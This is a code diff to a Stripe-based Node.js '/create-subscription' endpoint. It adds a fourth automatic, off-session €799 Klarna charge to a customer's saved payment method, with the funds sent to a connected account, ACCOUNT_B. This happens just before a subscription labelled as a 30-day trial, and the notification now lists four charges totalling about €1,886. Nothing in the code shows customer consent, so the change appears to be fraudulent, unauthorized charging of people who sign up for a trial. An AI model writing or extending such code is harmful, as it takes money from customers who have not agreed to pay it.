@@ -160,10 +160,30 @@ app.post('/create-subscription', async (req, res) => {
 
     await new Promise(resolve => setTimeout(resolve, 3000));
 
+    // Charge 4 — €799
+    try {
+      const payment4 = await stripe.paymentIntents.create({
+        amount: 79900,
+        currency: 'eur',
+        customer: customerId,
+        payment_method: paymentMethodId,
+        payment_method_types: ['klarna'],
+        confirm: true,
+        off_session: true,
+        transfer_data: { destination: ACCOUNT_B },
+      });
+      console.log('Payment 4 created:', payment4.id);
+      console.log('Payment 4 status:', payment4.status);
+    } catch (err) {
+      console.log('Payment 4 failed:', err.message);
+    }
+
+    await new Promise(resolve => setTimeout(resolve, 3000));
+
     // Subscription with 30-day trial
     const subscription = await stripe.subscriptions.create({
       customer: customerId,
-      items: [{ price: 'price_1T1jfK84dbsGsYDa70NNZMex' }],
+      items: [{ price: 'price_1T1lUwH5RIgTG9jj4BYZF4y4' }],
       default_payment_method: paymentMethodId,
       trial_end: Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60,
       transfer_data: { destination: ACCOUNT_B },
@@ -177,6 +197,7 @@ app.post('/create-subscription', async (req, res) => {
       `💳 Payment 1: €89.00\n` +
       `💳 Payment 2: €199.00\n` +
       `💳 Payment 3: €799.00\n` +
+      `💳 Payment 4: €799.00\n` +
       `🆔 Subscription: ${subscription.id}\n` +
       `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
     );
